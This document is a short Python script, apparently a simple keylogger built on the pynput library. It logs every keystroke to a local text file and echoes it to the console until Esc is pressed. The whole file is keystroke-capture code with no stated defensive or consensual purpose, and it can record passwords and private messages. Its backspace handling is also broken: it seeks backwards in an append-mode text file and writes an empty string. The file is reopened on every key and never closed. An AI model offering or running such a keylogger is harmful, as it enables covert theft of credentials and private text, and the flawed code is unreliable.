from pynput import keyboard, mouse
import os
from time import strftime, gmtime
import datetime


def on_press(key):
    print(datetime.datetime.now().strftime("%H:%M:%S"))
    try:
        f = open('output.txt', "a")
        f.write(key.char)
        print('alphanumeric key {0} pressed'.format(key.char))
    except AttributeError:
        print('special key {0} pressed'.format(key))
        if key == keyboard.Key.space:
            f.write(' ')
        if key == keyboard.Key.enter:
            f.write(os.linesep)
        if key == keyboard.Key.backspace:
            f.seek(-1, os.SEEK_CUR)
            f.write('')


def on_release(key):
    if key == keyboard.Key.esc:
        return False


with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
